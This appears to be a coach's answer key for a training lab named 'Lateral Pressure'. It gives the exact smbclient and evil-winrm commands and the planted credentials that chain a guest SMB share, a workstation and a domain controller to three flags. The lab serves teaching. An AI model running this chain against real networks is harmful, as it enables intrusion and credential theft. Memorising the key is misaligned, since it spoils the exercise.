# Coach context — Lateral Pressure

## Intended path

1. `smbclient -L //<files01>/ -N` → `share` is guest-readable →
   `smbclient //files01/share -N` → `flag.txt` (**files-flag**) +
   `backups/ws-creds.txt` → `CORP\wuser / Work2024!` for ws01.
2. `evil-winrm -i <ws01> -u wuser -p 'Work2024!'` (domain user; prefix
   `.\wuser` if domain auth fails) → `C:\flags\workstation.txt` →
   **ws-flag**; `C:\ops\dc-note.txt` → DA creds `adm-ops / D@main2024!`.
3. `evil-winrm -i <dc01> -u adm-ops -p 'D@main2024!'` →
   `C:\flags\domain-admin.txt` → **dc-flag**.

## Key facts (stage 2–3 only)

- Cred chain: `wuser/Work2024!` (ws01, domain user) →
  `adm-ops/D@main2024!` (DC).
- files01's share name is `share`; creds in `backups/ws-creds.txt`.
- If trainees try kerberos/winrm auth failures — fall back to
  `.\wuser` local-style or `CORP\wuser` UPN forms.

## Common wrong turns

- Attacking the DC first — it's the last hop; the chain starts at the share.
- Authenticated-only smb attempts — the share is explicitly guest-readable.
- Treating ws01 as a dead end after one flag — the note file is the pivot.
